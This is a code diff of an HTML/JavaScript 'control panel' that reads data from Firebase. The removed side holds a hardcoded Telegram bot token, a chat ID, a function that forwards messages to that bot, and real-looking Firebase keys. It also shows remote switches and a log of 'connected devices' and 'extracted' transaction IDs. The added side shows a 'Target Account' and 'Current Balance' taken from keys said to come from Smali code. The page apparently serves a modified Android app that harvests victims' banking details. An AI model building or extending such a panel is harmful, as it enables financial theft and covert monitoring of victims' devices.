@@ -1,78 +1,82 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Abbas Pro - Final Fix</title>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+    <title>Control Panel</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        :root { --main: #003366; --gold: #d4af37; --bg: #f4f7f6; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: var(--bg); margin: 0; padding: 10px; }
-        .card { background: white; max-width: 450px; margin: auto; border-radius: 20px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); overflow: hidden; border-top: 6px solid var(--main); }
-        .header { background: var(--main); color: white; padding: 20px; text-align: center; }
-        .content { padding: 20px; }
-        .btn { width: 100%; padding: 15px; border-radius: 12px; border: none; font-size: 16px; font-weight: bold; cursor: pointer; margin-bottom: 10px; transition: 0.3s; }
-        .btn-on { background: #27ae60; color: white; }
-        .btn-off { background: #e74c3c; color: white; }
-        .btn-turbo { background: var(--gold); color: white; border: 2px solid #b8962e; }
-        .section { background: #f9f9f9; border-radius: 12px; padding: 12px; margin-top: 15px; border-right: 4px solid var(--main); }
-        .trans-id { color: #d35400; font-weight: bold; font-family: monospace; background: #fff3e0; padding: 2px 5px; border-radius: 4px; border: 1px solid #ffcc80; }
-        .footer { text-align: center; padding: 15px; font-size: 12px; color: #888; background: #eee; }
+        body { font-family: sans-serif; background-color: #f4f7f6; margin: 0; padding: 20px; text-align: center; }
+        .container { max-width: 800px; margin: auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        .card { border: 1px solid #ddd; padding: 15px; margin: 10px; border-radius: 8px; display: inline-block; width: 40%; }
+        .value { font-size: 24px; font-weight: bold; color: #2c3e50; }
+        .label { color: #7f8c8d; margin-bottom: 5px; }
+        #loading { font-style: italic; color: #e67e22; }
+        .status-online { color: #27ae60; font-weight: bold; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="header">
-        <h2 style="margin:0;">نظام عباس الدولي v2.0</h2>
-        <p style="font-size:11px; opacity:0.8;">تحديث مزامنة الأجهزة النشطة</p>
-    </div>
-
-    <div class="content">
-        <div id="stat" style="text-align:center; font-weight:bold; margin-bottom:15px; color:#333;">جاري فحص الاتصال...</div>
-        
-        <button id="mainBtn" class="btn" onclick="toggleStatus()">تحميل...</button>
-        <button id="turboBtn" class="btn btn-turbo" onclick="toggleTurbo()">الوضع الخارق: تحميل...</button>
-
-        <div class="section">
-            <strong style="color:#d35400">آخر رقم مرجعي (Ref ID):</strong>
-            <div id="extractedTrans" style="font-size:13px; margin-top:5px;">في انتظار أول عملية...</div>
+<div class="container">
+    <h2>System Dashboard</h2>
+    <div id="loading">Waiting for device data...</div>
+    
+    <div id="data-section" style="display: none;">
+        <div class="card">
+            <div class="label">Target Account</div>
+            <div id="acc_val" class="value">0000000</div>
         </div>
-
-        <div class="section">
-            <strong style="color:var(--main)">سجل الأنشطة (الأجهزة المتصلة):</strong>
-            <div id="logs" style="font-size:13px; margin-top:5px; max-height: 200px; overflow-y: auto;">جاري جلب الأجهزة...</div>
+        <div class="card">
+            <div class="label">Current Balance</div>
+            <div id="cash_val" class="value">0.00</div>
+        </div>
+        <div style="margin-top: 20px;">
+            Status: <span class="status-online">Connected</span>
         </div>
     </div>
-
-    <div class="footer">برمجة وتصميم - عباس الدولي@2026</div>
 </div>
 
 <script>
-    const teleToken = "8308447003:AAFhOi_gqBO6FMg5tHJzhAZ_4OgLDvFkJOo";
-    const teleChatId = "5957156447";
-
-    function sendTele(txt) {
-        fetch(`https://api.telegram.org/bot${teleToken}/sendMessage?chat_id=${teleChatId}&text=${encodeURIComponent(txt)}`);
-    }
-
+    // Paste your Firebase Config here
     const firebaseConfig = {
-        apiKey: "AIzaSyAoAfx2voGpTuXh2I-V2XpgOyn5kAM6YIA",
-        authDomain: "sudancontrol-c5050.firebaseapp.com",
-        databaseURL: "https://sudancontrol-c5050-default-rtdb.firebaseio.com",
-        projectId: "sudancontrol-c5050",
-        storageBucket: "sudancontrol-c5050.appspot.com"
+        apiKey: "YOUR_API_KEY",
+        authDomain: "YOUR_PROJECT.firebaseapp.com",
+        databaseURL: "YOUR_DATABASE_URL",
+        projectId: "YOUR_PROJECT_ID",
+        storageBucket: "YOUR_PROJECT.appspot.com",
+        messagingSenderId: "YOUR_ID",
+        appId: "YOUR_APP_ID"
     };
+
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
 
-    // إدارة الأزرار
-    let status = false, turbo = false;
-    db.ref('control/status').on('value', snap => {
-        status = snap.val() === "true" || snap.val() === true;
-        document.getElementById('stat').innerText = "
+    // Matching your App's paths: "Account" and "Cash"
+    const dataRef = db.ref('Updates'); 
+
+    dataRef.on('value', (snapshot) => {
+        const loadingTrigger = document.getElementById('loading');
+        const dataSection = document.getElementById('data-section');
+        
+        if (snapshot.exists()) {
+            loadingTrigger.style.display = 'none';
+            dataSection.style.display = 'block';
+            
+            snapshot.forEach((childSnapshot) => {
+                const val = childSnapshot.val();
+                
+                // Directly reading the keys from your Smali code
+                if(val.Account) {
+                    document.getElementById('acc_val').innerText = val.Account;
+                }
+                if(val.Cash) {
+                    document.getElementById('cash_val').innerText = val.Cash;
+                }
+            });
+        }
     });
 </script>
+
 </body>
 </html>
